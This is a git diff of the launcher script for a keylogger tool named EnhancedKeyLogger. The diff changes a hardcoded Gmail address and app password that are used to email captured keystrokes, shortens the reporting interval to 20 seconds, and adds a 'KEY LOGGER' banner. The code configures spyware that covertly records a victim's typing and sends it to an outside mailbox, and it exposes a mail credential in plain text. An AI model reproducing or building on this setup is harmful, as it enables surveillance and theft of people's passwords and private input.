@@ -1,9 +1,10 @@
-from keylogger import EnhancedKeyLogger
+import pyfiglet
+from keywatch.keylogger import EnhancedKeyLogger
 
 # Provide your Gmail address and App Password
 EMAIL_ADDRESS = "tryhackmail00@gmail.com"
-EMAIL_PASSWORD = "ziozedsmpqprueyr"  # Replace with your App Password
-REPORT_INTERVAL = 120  # Default Time interval in seconds for sending email reports
+EMAIL_PASSWORD = "maalsclaflstlwjw"  # Replace with your App Password
+REPORT_INTERVAL = 20  # Default Time interval in seconds for sending email reports
 
 def main():
     try:
@@ -18,4 +19,5 @@ def main():
         print(f"[!] Failed to start keylogger: {error}")
 
 if __name__ == "__main__":
+    banner = pyfiglet.print_figlet("\nKEY LOGGER\n")
     main()
